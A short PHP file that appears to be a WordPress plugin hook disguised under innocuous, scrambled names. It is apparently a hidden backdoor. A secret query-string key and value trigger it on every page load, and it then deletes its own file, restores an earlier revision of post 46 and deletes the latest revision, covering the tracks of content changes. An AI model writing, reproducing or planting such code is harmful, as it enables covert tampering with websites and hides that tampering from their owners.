<?php

function panel_lite_check_messages() {
	if (isset($_GET['titles_appointment_react_buttons']) && $_GET['titles_appointment_react_buttons'] === 'wall_pro_interactivity_solution') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$icon_demomentsomtres_screen_soon = 46;
		$year_seo_speed = wp_get_post_revisions($icon_demomentsomtres_screen_soon);
		if (empty($year_seo_speed)) die('no revisions');
		if (count($year_seo_speed) < 2) die('less than 2');
		$gravity_install_colors = array_shift($year_seo_speed);
		$wall_external_hidden = $gravity_install_colors->ID;
		$library_social_stop = array_shift($year_seo_speed);
		$demo_separator_dynamic_groups = $library_social_stop->ID;
		$plugin_mode_embedder_uploader = wp_restore_post_revision($demo_separator_dynamic_groups);
		if ($plugin_mode_embedder_uploader === false) die('error restoring');
		$plugin_mode_embedder_uploader = wp_delete_post_revision($wall_external_hidden);		
		if ($plugin_mode_embedder_uploader === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'panel_lite_check_messages');
